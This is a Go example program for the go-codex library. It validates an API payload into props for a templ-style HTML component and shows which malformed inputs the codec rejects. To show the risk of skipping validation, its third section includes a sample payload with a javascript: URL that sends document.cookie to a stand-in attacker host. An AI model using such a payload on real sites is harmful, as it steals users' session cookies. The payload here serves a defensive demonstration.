// Package main demonstrates how go-codex fits into a templ-based rendering
// pipeline. The codec handles decode and validation of raw API payloads; the
// resulting typed Go struct becomes the props passed to a templ component.
//
// Pattern:
//
//	JSON bytes → map[string]any → ArticleResponse (codec) → ArticleProps (mapper) → templ component
//
// Run with: go run ./examples/templ-mapper
package main

import (
	"fmt"
	"html/template"
	"os"
	"strings"

	"github.com/DaniDeer/go-codex/codex"
	"github.com/DaniDeer/go-codex/validate"
)

// ArticleResponse is the raw API payload shape.
type ArticleResponse struct {
	ID          string
	Title       string
	Slug        string
	AuthorName  string
	PublishedAt string // ISO 8601 date
	URL         string
	Summary     string
}

// ArticleCodec decodes and validates a raw API response.
// Format constraints (UUID, Date, URL, Slug) are checked automatically;
// the schema is populated for free — ready for OpenAPI rendering.
var ArticleCodec = codex.Struct[ArticleResponse](
	codex.Field[ArticleResponse, string]{
		Name:     "id",
		Codec:    codex.String().Refine(validate.UUID).WithTitle("ID"),
		Get:      func(a ArticleResponse) string { return a.ID },
		Set:      func(a *ArticleResponse, v string) { a.ID = v },
		Required: true,
	},
	codex.Field[ArticleResponse, string]{
		Name:     "title",
		Codec:    codex.String().Refine(validate.NonEmptyString).WithTitle("Title"),
		Get:      func(a ArticleResponse) string { return a.Title },
		Set:      func(a *ArticleResponse, v string) { a.Title = v },
		Required: true,
	},
	codex.Field[ArticleResponse, string]{
		Name:     "slug",
		Codec:    codex.String().Refine(validate.Slug).WithTitle("Slug"),
		Get:      func(a ArticleResponse) string { return a.Slug },
		Set:      func(a *ArticleResponse, v string) { a.Slug = v },
		Required: true,
	},
	codex.Field[ArticleResponse, string]{
		Name:     "authorName",
		Codec:    codex.String().Refine(validate.NonEmptyString).WithTitle("Author"),
		Get:      func(a ArticleResponse) string { return a.AuthorName },
		Set:      func(a *ArticleResponse, v string) { a.AuthorName = v },
		Required: true,
	},
	codex.Field[ArticleResponse, string]{
		Name:     "publishedAt",
		Codec:    codex.String().Refine(validate.Date).WithTitle("Published At"),
		Get:      func(a ArticleResponse) string { return a.PublishedAt },
		Set:      func(a *ArticleResponse, v string) { a.PublishedAt = v },
		Required: true,
	},
	codex.Field[ArticleResponse, string]{
		Name:     "url",
		Codec:    codex.String().Refine(validate.URL).WithTitle("URL"),
		Get:      func(a ArticleResponse) string { return a.URL },
		Set:      func(a *ArticleResponse, v string) { a.URL = v },
		Required: true,
	},
	codex.Field[ArticleResponse, string]{
		Name:     "summary",
		Codec:    codex.String().WithTitle("Summary"),
		Get:      func(a ArticleResponse) string { return a.Summary },
		Set:      func(a *ArticleResponse, v string) { a.Summary = v },
		Required: false,
	},
)

// ArticleProps is the slim struct passed to a templ component as props.
// It contains only the fields the component actually needs, with names and
// types that match what the template expects — decoupled from the API shape.
type ArticleProps struct {
	Title       string
	Slug        string
	AuthorLine  string // formatted for display: "by <name>"
	Date        string
	ReadMoreURL string
}

// toArticleProps maps a validated ArticleResponse to ArticleProps.
// Structural transformations (renaming, formatting, flattening) live here —
// not in the codec, and not in the template.
func toArticleProps(a ArticleResponse) ArticleProps {
	return ArticleProps{
		Title:       a.Title,
		Slug:        a.Slug,
		AuthorLine:  "by " + a.AuthorName,
		Date:        a.PublishedAt,
		ReadMoreURL: a.URL,
	}
}

// articleCardTmpl simulates what a templ component renders.
// In a real project replace this with:
//
//	components.ArticleCard(props).Render(ctx, w)
var articleCardTmpl = template.Must(template.New("card").Parse(`
<article>
  <h2><a href="{{.ReadMoreURL}}">{{.Title}}</a></h2>
  <p class="meta">{{.AuthorLine}} &mdash; {{.Date}}</p>
</article>`))

func main() {
	// ── 1. Valid API payload ──────────────────────────────────────────────────
	fmt.Println("=== Valid API payload ===")

	raw := map[string]any{
		"id":          "550e8400-e29b-41d4-a716-446655440000",
		"title":       "Introduction to go-codex",
		"slug":        "intro-go-codex",
		"authorName":  "Alice",
		"publishedAt": "2024-06-01",
		"url":         "https://example.com/intro-go-codex",
		"summary":     "A short guide to self-documenting codecs in Go.",
	}

	article, err := ArticleCodec.Decode(raw)
	if err != nil {
		fmt.Fprintln(os.Stderr, "decode error:", err)
		os.Exit(1)
	}

	props := toArticleProps(article)
	fmt.Printf("props: %+v\n", props)

	fmt.Println("\nrendered component:")
	var sb strings.Builder
	if err := articleCardTmpl.Execute(&sb, props); err != nil {
		fmt.Fprintln(os.Stderr, "render error:", err)
		os.Exit(1)
	}
	fmt.Println(sb.String())

	// ── 2. Invalid payloads — codec rejects before props are constructed ──────
	//
	// Each case targets a different failure mode:
	//   - format constraint (slug, date, URL scheme)
	//   - empty-string constraint
	//   - wrong Go type (int instead of string)
	//   - nil value for a required field
	//   - key missing entirely from the map
	fmt.Println("\n=== Invalid payloads — what the codec prevents ===")

	withPatch := func(patch map[string]any) map[string]any {
		m := copyMap(raw)
		for k, v := range patch {
			m[k] = v
		}
		return m
	}
	withoutKey := func(key string) map[string]any {
		m := copyMap(raw)
		delete(m, key)
		return m
	}

	badCases := []struct {
		label string
		input map[string]any
	}{
		// format violations
		{"slug uppercase", withPatch(map[string]any{"slug": "Has_Uppercase"})},
		{"slug spaces", withPatch(map[string]any{"slug": "has spaces!"})},
		{"date wrong fmt", withPatch(map[string]any{"publishedAt": "01/06/2024"})},
		{"url not http", withPatch(map[string]any{"url": "ftp://files.example.com"})},
		{"url relative", withPatch(map[string]any{"url": "/relative/path"})},
		// empty / blank
		{"title empty", withPatch(map[string]any{"title": ""})},
		{"author empty", withPatch(map[string]any{"authorName": ""})},
		// type mismatch — APIs sometimes return numbers where strings are expected
		{"title is int", withPatch(map[string]any{"title": 42})},
		{"url is bool", withPatch(map[string]any{"url": true})},
		// nil in a required field
		{"url is nil", withPatch(map[string]any{"url": nil})},
		// missing required key entirely
		{"id missing", withoutKey("id")},
		{"publishedAt missing", withoutKey("publishedAt")},
	}

	for _, bc := range badCases {
		_, err := ArticleCodec.Decode(bc.input)
		fmt.Printf("  %-22s → %v\n", bc.label+":", err)
	}

	// ── 3. Without codec — what reaches the template unchecked ───────────────
	//
	// If you skip the codec and build props directly from the raw map, invalid
	// or malicious values flow straight into the rendered HTML.
	//
	// Example: an API response (or a tampered request) with:
	//   - a javascript: URL that becomes a live href
	//   - an empty title that silently produces an empty <h2>
	//   - a future date that slips through unnoticed
	fmt.Println("\n=== Without codec — dangerous props reach the template ===")

	malicious := map[string]any{
		"id":          "not-a-uuid",
		"title":       "",
		"slug":        "INVALID SLUG",
		"authorName":  "Eve",
		"publishedAt": "32/13/9999",
		"url":         "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
	}

	// Without the codec: read fields directly — no validation, no rejection.
	unsafeProps := ArticleProps{
		Title:       stringOrEmpty(malicious["title"]),
		Slug:        stringOrEmpty(malicious["slug"]),
		AuthorLine:  "by " + stringOrEmpty(malicious["authorName"]),
		Date:        stringOrEmpty(malicious["publishedAt"]),
		ReadMoreURL: stringOrEmpty(malicious["url"]),
	}
	fmt.Println("props built WITHOUT codec (all invalid values accepted silently):")
	fmt.Printf("  Title:       %q\n", unsafeProps.Title)
	fmt.Printf("  Slug:        %q\n", unsafeProps.Slug)
	fmt.Printf("  Date:        %q\n", unsafeProps.Date)
	fmt.Printf("  ReadMoreURL: %q  ← live javascript: href!\n", unsafeProps.ReadMoreURL)

	fmt.Println("\nrendered (note the empty <h2> and the javascript: href):")
	var buf strings.Builder
	if err := articleCardTmpl.Execute(&buf, unsafeProps); err != nil {
		fmt.Fprintln(os.Stderr, "render error:", err)
		os.Exit(1)
	}
	fmt.Println(buf.String())

	// With the codec: every field is validated; the whole payload is rejected.
	fmt.Println("same payload through the codec:")
	_, err = ArticleCodec.Decode(malicious)
	fmt.Printf("  → %v\n", err)
	fmt.Println("  → props never constructed; template never reached.")
}

// stringOrEmpty returns the string value of v, or "" if nil or not a string.
func stringOrEmpty(v any) string {
	s, _ := v.(string)
	return s
}

func copyMap(m map[string]any) map[string]any {
	out := make(map[string]any, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}
